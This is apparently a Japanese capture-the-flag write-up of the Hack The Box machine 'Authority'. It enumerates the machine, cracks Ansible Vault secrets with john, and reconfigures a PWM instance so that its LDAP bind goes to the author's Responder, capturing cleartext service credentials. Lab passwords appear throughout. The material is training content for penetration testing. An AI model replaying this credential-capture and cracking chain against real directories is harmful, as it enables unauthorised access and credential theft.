![](https://i.imgur.com/MFFHLmO.png)


- URL : https://app.hackthebox.com/machines/553
- #medium 
- OS : #Windows
- Machine Author(s): [mrb3n8132 &](https://app.hackthebox.com/users/2984) [Sentinal](https://app.hackthebox.com/users/206770)
- Hack Date: 2025-7-29

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ


## Nmap

| **ポート**   | **サービス**     | **バージョン**                               | **その他**                                                                           |
| --------- | ------------ | --------------------------------------- | --------------------------------------------------------------------------------- |
| 53/tcp    | **DNS**      | Simple DNS Plus                         |                                                                                   |
| 80/tcp    | **HTTP**     | Microsoft IIS httpd 10.0                | TRACEメソッド許可、http-server-header: Microsoft-IIS/10.0、http-title: IIS Windows Server |
| 88/tcp    | **kerberos** | Microsoft Windows Kerberos              | server time: 2025-07-28 19:27:43Z                                                 |
| 135/tcp   | msrpc        | Microsoft Windows RPC                   |                                                                                   |
| 139/tcp   | SMB          | Microsoft Windows netbios-ssn           |                                                                                   |
| 389/tcp   | **LDAP**     | Microsoft Windows Active Directory LDAP | Domain: authority.htb, SSL証明書情報あり                                                 |
| 445/tcp   | **SMB**      | 不明                                      |                                                                                   |
| 464/tcp   | kpasswd5?    | 不明                                      |                                                                                   |
| 593/tcp   | ncacn_http   | Microsoft Windows RPC over HTTP 1.0     |                                                                                   |
| 636/tcp   | **LDAPS**    | Microsoft Windows Active Directory LDAP | Domain: authority.htb, SSL証明書情報あり                                                 |
| 3268/tcp  | ldap         | Microsoft Windows Active Directory LDAP | Domain: authority.htb, SSL証明書情報あり                                                 |
| 3269/tcp  | ssl/ldap     | Microsoft Windows Active Directory LDAP | Domain: authority.htb, SSL証明書情報あり                                                 |
| 5985/tcp  | **Winrm**    | Microsoft HTTPAPI httpd 2.0             | http-title: Not Found, http-server-header: Microsoft-HTTPAPI/2.0<br>デフォルトポートじゃない  |
| 8443/tcp  | **ssl/http** | Apache Tomcat                           | タイトルなし、favicon不明、SSL証明書: CN=172.16.2.118<br>デフォルトポートじゃない                          |
| 9389/tcp  | mc-nmf       | .NET Message Framing                    |                                                                                   |
| 47001/tcp | http         | Microsoft HTTPAPI httpd 2.0             | http-title: Not Found, http-server-header: Microsoft-HTTPAPI/2.0                  |
| 49664/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                   |
| 49665/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                   |
| 49666/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                   |
| 49667/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                   |
| 49673/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                   |
| 49690/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.0     |                                                                                   |
| 49691/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                   |
| 49693/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                   |
| 49694/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                   |
| 49703/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                   |
| 49714/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                   |
| 57121/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                   |


```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-28 19:27:43Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-07-28T19:28:54+00:00; +3h59m57s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
<SNIP>
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-07-28T19:28:54+00:00; +3h59m57s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
<SNIP>
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-07-28T19:28:54+00:00; +3h59m57s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
<SNIP>
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
| -----BEGIN CERTIFICATE-----
| MIIFxjCCBK6gAwIBAgITPQAAAANt51hU5N024gAAAAAAAzANBgkqhkiG9w0BAQsF
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-07-28T19:28:54+00:00; +3h59m57s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/http      syn-ack ttl 127 Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-26T19:22:24
| Not valid after:  2027-07-29T07:00:48
| MD5:   ab1e:95ab:e231:f83d:b68c:4721:59b1:5eb2
| SHA-1: 87e2:4e2a:6ad1:8fd9:cced:f13e:e656:bbda:779a:b7ba
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIGEmr9dAQgMA0GCSqGSIb3DQEBCwUAMBcxFTATBgNVBAMM
<SNIP>
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49690/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57121/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Windows Server 2019 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 (93%), Microsoft Windows 10 1903 (92%), Microsoft Windows Vista SP1 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=7/28%OT=53%CT=%CU=44404%PV=Y%DS=2%DC=T%G=N%TM=6887973E%P=aarch64-unknown-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)
SEQ(SP=107%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h59m57s, deviation: 1s, median: 3h59m56s
| smb2-time: 
|   date: 2025-07-28T19:28:46
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26386/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40351/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34516/udp): CLEAN (Failed to receive data)
|   Check 4 (port 48328/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

ドメイン　: authority.htb.corp
`DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB`

## Enum4linux
```sh
└─$ enum4linux -A  $Target_IP
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jul 28 19:22:12 2025

 =========================================( Target Information )=========================================

Target ........... 10.129.182.140
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.129.182.140 )===========================


[E] Can't find workgroup/domain



 ==================================( Session Check on 10.129.182.140 )==================================


[+] Server 10.129.182.140 allows sessions using username '', password ''


 ===============================( Getting domain SID for 10.129.182.140 )===============================

do_cmd: Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED

[+] Can't determine if host is part of domain or part of a workgroup

enum4linux complete on Mon Jul 28 19:22:24 2025
```

## nxc
- ゲストでのLDAPユーザー列挙
	- 認証しないと無理
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ nxc ldap authority.htb.corp -u 'guest' -p '' --users
LDAP        10.129.182.140  389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
LDAPS       10.129.182.140  636    AUTHORITY        [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090ACD, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
LDAPS       10.129.182.140  636    AUTHORITY        [+] authority.htb\guest: 
LDAPS       10.129.182.140  636    AUTHORITY        [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090ACD, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
                                                                               
```

## HTTPS
- `https://10.129.182.140:8443/`にアクセスすると、`https://10.129.182.140:8443/pwm/private/login`にリダイレクトされる

![](https://i.imgur.com/1E6Liaq.png)

翻訳
- 構成モードアツい
- LDAPディレクトリに認証しないで、設定を変更できる
```txt
⚙️ PWM は現在「構成モード」です
このモードでは、LDAPディレクトリに認証せずに設定を変更することが可能です。
ただし、エンドユーザー向けの機能はこのモードでは使用できません。
LDAPディレクトリの設定を確認した後は、設定マネージャーを使用して構成へのアクセスを制限してください。
制限をかけた後でも設定の変更は可能ですが、その際にはLDAPディレクトリへの認証が必要になります
```

![](https://i.imgur.com/5PmVewB.png)

adminとか試すとこれ
![](https://i.imgur.com/PTs8qgT.png)

パスワードわからん
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ impacket-GetNPUsers authority.htb.corp/svc_pwm -dc-ip 10.129.182.140 -format hashcat -outputfile asrep_hashes.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
```

PWMとはこれ
- LDAP ディレクトリ用のオープン ソース パスワード セルフサービス アプリケーション
- https://github.com/pwm-project/pwm

バージョンは、**PWM v2.0.3 bc96802e**だとわかる
![](https://i.imgur.com/aNppy1x.png)

現在、cofigrationモードだから、設定を変更したい

以下の画面で、Passwordに何も入れないで送る
![](https://i.imgur.com/bdB43ru.png)

以下のようなレスポンスがあり、X-Pwm-Ambに、
> 「プレーンテキストに見えるからといって、1024ビットのAES鍵がステガノグラフィ的に埋め込まれていないとは限らない」
```http
HTTP/2 200 OK
Vary: Accept-Encoding
X-Pwm-Sessionid: sldOt
Content-Language: en
X-Pwm-Noise: jG1ZggOQmzWbZBjwML1M8IcK8gv0CCmmvoqZ0xSdtqiD1hGAzaV8kfAqGEEjkDkpgDlyoVhXk6ljdB849s2f29LTHdeYbDiU8PFrcg04VOh0vV1NvUuyN8
X-Content-Type-Options: nosniff
X-Xss-Protection: 1
X-Pwm-Instance: 6C454BD57D0993A8
Server: PWM
X-Frame-Options: DENY
X-Pwm-Amb: just because it looks plaintext doesn't mean there isn't a steganographic 1024bit AES key
Cache-Control: no-cache, no-store, must-revalidate, proxy-revalidate
Content-Security-Policy: default-src 'self'; object-src 'none'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; report-uri /pwm/public/command/cspReport
Content-Length: 0
Date: Tue, 29 Jul 2025 07:24:47 GMT
```

こちらも同様にX-Pwm-Ambに
> 「プレーンテキストに見えるからといって、1024ビットのAES鍵がステガノグラフィ的に埋め込まれていないとは限らない」
と書いてある
```http
HTTP/2 200 OK
Vary: Accept-Encoding
X-Pwm-Sessionid: sldOt
Content-Language: en
X-Pwm-Noise: T0cfsWhp1rLDqOweeczrgZUWWmuGdtq70c0wHDZS9VTlIsXQsHW9LeiT7uSr4v9YVTlONlT52yRiHQ9qmoMktyTDJjvBL6uXkc5jf08fYkTrRrihea
X-Content-Type-Options: nosniff
X-Xss-Protection: 1
X-Pwm-Instance: 6C454BD57D0993A8
Server: PWM
X-Frame-Options: DENY
X-Pwm-Amb: This sure is a lot of code to change one measly string.
Cache-Control: no-cache, no-store, must-revalidate, proxy-revalidate
Content-Security-Policy: default-src 'self'; object-src 'none'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; report-uri /pwm/public/command/cspReport
Content-Length: 0
Date: Tue, 29 Jul 2025 07:24:31 GMT


```

何回か送って得られたヒント
- このヒントは全部嘘・ひっかけであることが後にわかる
	- X-Pwm-Amb: Fruit flies have one time use passwords
	- X-Pwm-Amb: Your password must be scanned by the TSA to ensure the safety of your fellow travelers.  Please take off your password's shoes to continue.
	- X-Pwm-Amb: NOTICE: This header is protected by the Digital Millennium Copyright Act of 1996.  Reading this header is strictly forbidden.
	- X-Pwm-Amb: I needed a password eight characters long so I picked Snow White and the Seven Dwarves.
	- x-pwm-amb' : The zombie's password is expired.
## nikto
```bash
(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ nikto -h https://10.129.182.140:8443/pwm/private/config/login
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.182.140
+ Target Hostname:    10.129.182.140
+ Target Port:        8443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=172.16.2.118
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /CN=172.16.2.118
+ Start Time:         2025-07-28 20:46:08 (GMT-7)
---------------------------------------------------------------------------
+ Server: PWM
+ /pwm/private/config/login/: Uncommon header 'x-pwm-amb' found, with contents: The zombie's password is expired.
+ /pwm/private/config/login/: Uncommon header 'x-pwm-noise' found, with contents: A1J8aTvOeSKbqBwxmxM82h.
+ /pwm/private/config/login/: Uncommon header 'x-pwm-sessionid' found, with contents: yxKGR.
+ /pwm/private/config/login/: Uncommon header 'x-pwm-instance' found, with contents: 6C454BD57D0993A8.
+ /pwm/private/config/login/: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ Root page /pwm/private/config/login redirects to: /pwm/private/config/login/?stickyRedirectTest=key
+ /pwm/private/config/login/fLLcTzbk.bat|dir: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/

```

## SMB
- SMB参照すると、 Department SharesとDevelopmentがあることがわかる
```sh
──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ smbclient -N -L //$Target_IP

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        Development     Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.182.140 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Development の中身を見てみる
```sh
└─$ smbclient -N //10.129.182.140/Development 
Try "help" to get a list of possible commands.
smb: \> ls
c  .                                   D        0  Fri Mar 17 06:20:38 2023
  ..                                  D        0  Fri Mar 17 06:20:38 2023
  Automation                          D        0  Fri Mar 17 06:20:40 2023
d 
                5888511 blocks of size 4096. 1493435 blocks available
smb: \> cd Automation
smb: \Automation\> ls
  .                                   D        0  Fri Mar 17 06:20:40 2023
  ..                                  D        0  Fri Mar 17 06:20:40 2023
  Ansible                             D        0  Fri Mar 17 06:20:50 2023

                5888511 blocks of size 4096. 1493435 blocks available
smb: \Automation\> cd Ansible
smb: \Automation\Ansible\> ls
  .                                   D        0  Fri Mar 17 06:20:50 2023
  ..                                  D        0  Fri Mar 17 06:20:50 2023
  ADCS                                D        0  Fri Mar 17 06:20:48 2023
  LDAP                                D        0  Fri Mar 17 06:20:48 2023
  PWM                                 D        0  Fri Mar 17 06:20:48 2023
  SHARE                               D        0  Fri Mar 17 06:20:48 2023

```

まとめて取得
```bash
smbget --recursive --user=guest --no-pass smb://10.129.182.140/Development
```

```sh
┌──(kali㉿kali)-[~/…/Authority/Automation/Ansible/LDAP]
└─$ cat TODO.md 
- Change LDAP admin password after build -[COMPLETE]
- add tests for ubuntu 14, 16, debian 7 and 8, and centos 6 and 7
```

```sh
┌──(kali㉿kali)-[~/…/Authority/Automation/Ansible/PWM]
└─$ cat ansible.cfg  
[defaults]

hostfile = ansible_inventory
remote_user = svc_pwm

gathering = smart

# Set default roles_path to look for roles
roles_path = {{CWD}}/Roles


# Enable callback to track completion time for each task
callbacks_enabled=profile_tasks


# Disable SSH host key checking 
host_key_checking = False


# Configure Winrm connection timeout settings to run longer tasks
ansible_winrm_read_timeout_sec = 3000
ansible_winrm_connection_timeout = 3000


[ssh_connection]
pipelining = true
```


Tomcat Manageの認証情報の取得
```bash
┌──(kali㉿kali)-[~/…/Automation/Ansible/PWM/templates]
└─$ cat tomcat-users.xml.j2
<?xml version='1.0' encoding='cp1252'?>

<tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">

<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>  
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>

</tomcat-users>

```


### Ansible Vault
PWMの認証情報がAESで暗号化された認証情報が書かれてる
- https://exploit-notes.hdks.org/exploit/cryptography/algorithm/ansible-vault-secret/
```sh
┌──(kali㉿kali)-[~/…/Authority/Automation/Ansible/PWM]
└─$ cat defaults/main.yml
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764       
```

- 記事に沿って、まず、ansible2johnハッシュを生成し、解読する
```sh
└─$ cat > vault_data_clean.txt << 'EOF'
$ANSIBLE_VAULT;1.1;AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
EOF
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ ansible2john vault_data_clean.txt > ansible_hash.txt             
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ansible_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 ASIMD 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (vault_data_clean.txt)     
1g 0:00:00:11 DONE (2025-07-28 22:59) 0.09025g/s 3604p/s 3604c/s 3604C/s PASAWAY..prospect
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

 パスワードが、`!@#$%^&*`とわかったので、ファイルを復号化する
 - しかし、ファイル全体が暗号化されているわけではないので、以下のコマンドでそれぞれに分解して復号化する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ ansible localhost -m debug -a "msg={{ pwm_admin_login }}" \
  -e "@Automation/Ansible/PWM/defaults/main.yml" \
  --vault-password-file pass.txt
[WARNING]: No inventory was parsed, only implicit localhost is available
localhost | SUCCESS => {
    "msg": "svc_pwm"
}
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ ansible localhost -m debug -a "msg={{ pwm_admin_password }}" \
  -e "@Automation/Ansible/PWM/defaults/main.yml" \
  --vault-password-file pass.txt
[WARNING]: No inventory was parsed, only implicit localhost is available
localhost | SUCCESS => {
    "msg": "pWm_@dm!N_!23"
}
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ ansible localhost -m debug -a "msg={{ ldap_admin_password }}" \
  -e "@Automation/Ansible/PWM/defaults/main.yml" \
  --vault-password-file pass.txt 
[WARNING]: No inventory was parsed, only implicit localhost is available
localhost | SUCCESS => {
    "msg": "DevT3st@123"
}
    
```

それぞれの認証情報を取得できた
- pwm_admin_login : svc_pwm
- pwm_admin_password : pWm_@dm!N_!23
- ldap_admin_password : DevT3st@123

ログインできた
![](https://i.imgur.com/GFLZ07E.png)

# Foothold

### Responder
Configuration Activitiesから、Download Configurationして、パスワードを書き換える
- クラックしようとしたけど無理だった
サイトを使って計算
![](https://i.imgur.com/WUSy8j1.png)

書き換え箇所、変更前
```sh
        <setting key="pwmAdmin.queryMatch" modifyTime="2022-08-11T01:46:23Z" syntax="USER_PERMISSION" syntaxVersion="2">
            <label>Modules ⇨ Authenticated ⇨ Administration ⇨ Administrator Permission</label>
            <value>{"type":"ldapUser","ldapBase":"CN=svc_pwm,CN=Users,DC=authority,DC=htb"}</value>
```

変更後
- ユーザー名をsvc_pwmから、htb-stuに変更
```sh
        <setting key="pwmAdmin.queryMatch" modifyTime="2022-08-11T01:46:23Z" syntax="USER_PERMISSION" syntaxVersion="2">
            <label>Modules ⇨ Authenticated ⇨ Administration ⇨ Administrator Permission</label>
            <value>{"type":"ldapUser","ldapBase":"CN=htb-stu,CN=Users,DC=authority,DC=htb"}</value>
```

計算したhellohelloのハッシュ値
```sh
        <property key="configPasswordHash">$2a$08$.h6mdPfQMXtu5swYIaVZzOaCKss/5KYxuPESmisZXAD3M37PX0tZi</property>
```

てっきり上の作業で、ユーザーが作成されて、ログインできると思っていたが、できない
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Authority]
└─$ ldapsearch -x -H ldap://10.129.182.140 \
  -D "authority\\htb-stu" \
  -w 'hellohello' \   
  -b "DC=authority,DC=htb" \
  "(objectClass=*)"
ldap_bind: Invalid credentials (49)
        additional info: 80090308: LdapErr: DSID-0C090439, comment: AcceptSecurityContext error, data 52e, v4563

```

戦略を変え、IPを書き換える
- ここのldapsのURLを攻撃者のIPにする
- そして、responderを立ち上げておく
![](https://i.imgur.com/sWxqn50.png)


そして、自動的にログアウトし、ログインすると、Responderにsvc_ldapの認証情報が送られてくる
 svc_ldap : lDaP_1n_th3_cle4r!
- なんか、パスバック攻撃に似ている？
	- LDAPのアドレスを攻撃者のIPに書き換えて、そこに認証情報を飛ばすという意味で。
```sh

[+] Listening for events...                                                                                                                                                    

[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.129.59.172
